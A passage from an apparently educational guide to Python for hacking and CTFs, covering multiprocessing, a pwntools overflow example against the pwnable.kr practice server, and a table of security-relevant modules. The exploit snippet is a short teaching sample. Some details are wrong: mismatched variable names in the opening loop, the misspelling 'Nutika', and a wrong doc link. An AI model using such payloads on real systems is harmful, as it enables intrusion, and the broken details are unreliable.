for i in range(10): 
    process = Process(target=do_some_hack)
    t.start()
    t.join()
</pre>

Another way of speeding up Python is to use Nutika. Nutika compiles Python to C/C++. 

### Pwntools
"pwn" means to compromise or control another computer, web site, gateway device, or application. 
It is synonymous with one of the definitions of hacking or cracking. 

Python has a helpful library for this purpose, named pwntools. It is a framework made for CTFs. 

Example of usage of pwntools:
<pre>
from pwn import *  

host = "pwnable.kr"
port = 9000
payload = "AAAA" * 13 + p32(0xcafebabe)

target = remote(host, port)  
target.sendline(payload) 
target.interactive()
</pre>
* p32() - converts 4-bytes (32-bits) integer in a little endian format. 
* sendline(payload) - send the payload ending with a new line.
* target.interactive() - start interacting with the target (e.g. send shell commands).

<a name="modules"></a>
## Summary of all Python modules/packages you should know 
> Note that is a brief summary meant as a repetition, and examples are not exhaustive. You can read more in the earlier chapters
> or visit the links.  


Module | Description| Example usage
--- | --- | ---
[sys](https://docs.python.org/3/library/sys.html) | This module provides access to some objects used or maintained by the interpreter and to functions that interact strongly with the interpreter.  | _sys.argv_ - list of command-line arguments passed to the python script. _sys.exit()_  - exit from python.
[os](https://docs.python.org/3/library/sys.html) | Module for using Operating System (OS) dependent functionality, like processes, directories and environment variables.  |  _os.listdir(path='.')_ - returns a list of the entries (files and directories) for the given path. _os.wait()_ - wait for the completion of a file object.
[socket](https://docs.python.org/3/library/socket.html) | A low level network interface. Provides access to the BSD socket interface. | _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)_ - create a socket object with ipv4 address and TCP.
[threading](https://docs.python.org/3/library/threading.html) | A way for the Python program to split itself into two or more simultaneously running tasks in the same process space. Threading share memory space. | For speedup (several tasks can run in parallel). _t = threading.Thread(target=callable_object)_ - create a thread. callable_object is invoked by _t.run()_. 
[multiprocess](https://docs.python.org/2/library/multiprocessing.html) | Supports spawning processes using an API similar to the threading module. But it does not share memory space.| Also used for speedup (and avoids conflicts). _p = Process(target=callable_object)_ - spawn a process by creating a process object. It is invoked by calling _p.start()_. 
[Nutika](https://nuitka.net/) | Source-to-source compiler that compiles Python code to C/C++. Can make the program run faster. No need to have Python installed. | 
[subprocess](https://docs.python.org/3/library/subprocess.html) | Allows for spawning additional processes, connecting to their input/output/error pipes and get their return codes. The module can be used to start another program. | _subprocess.run("ls -l", capture_output=True)_ - the argument "ls -la" is used to launch the process. The output is captured.
[scapy](https://scapy.readthedocs.io/en/latest/) | Enables sending, sniffing, inspection and forging of network packets. Scapy can be used to build tools to scan, probe and attack networks.  | _sniff(filter="icmp and host 66.35.250.151", count=2)_ - sniff 2 icmp packets from 66.35.250.151. _send(IP(dst="1.2.3.4")/ICMP(), return_packets=True_) - send an ICMP packet on layer 3 to "dst" and return the sent packet.
[ctypes](https://docs.python.org/3/library/ctypes.html) | Provides C compatible data types and allows calling functions in DLLs or other shared libs. | ctypes _c_ubyte_ - an unsigned char in C, and int/long in python.
[struct](https://docs.python.org/2/library/struct.html) | Performs conversions between Python values and C structs represented as Python strings. Can be used to handle binary data stored in network connections. | Can for example be used to pack a given C structure (like a raw IP header ^). _struct.pack('I', 0xdeadbeef)_ - packs 0xdeadbeef to b'\xef\xbe\xad\xde'.  
[pickle](https://docs.python.org/3/library/pickle.html) | Serialization/deserialization. To pickle is to convert Python objects into byte streams, and unpickle is the opposite. | _pickle.dump(object, file)_ - write the pickled version of _object_ into the open _file_ object. 
[requests (urllib2)](https://2.python-requests.org/en/master/) | The best, simplest http library for python. | _req = requests.get("http://vg.no", headers=headers)_ - send a get request to vg with some headers. _req.content_ - access the response body as bytes.
[Crypto](https://pycryptodome.readthedocs.io/en/latest/src/api.html) | Organized into several sub-packets, each dedicated to solve one area of problems. | Generation of public/private keys, hashing, encryption  
[Paramiko](http://docs.paramiko.org/en/2.6/) | A python implementation of SSHv2. Provides client and server functionality. | _client = SSHClient()_ - initiate a ssh client. _connect(hostname, username, pwd, key ...)_ - Connect to an SSH server and authenticate to it 
[pwntools](https://docs.pwntools.com/en/stable/) | A CTF framework and exploit deployment library. Can be used to assemble, disassemble, packing integers, making connections, interact with processes, etc. | _recvuntil('>')_ - command for receiving data. _sendlineafter(':','\xe5\xff')_ - send some data after the specified initialisation. _p.interactive()_ - connecting to a process and interact with it. 
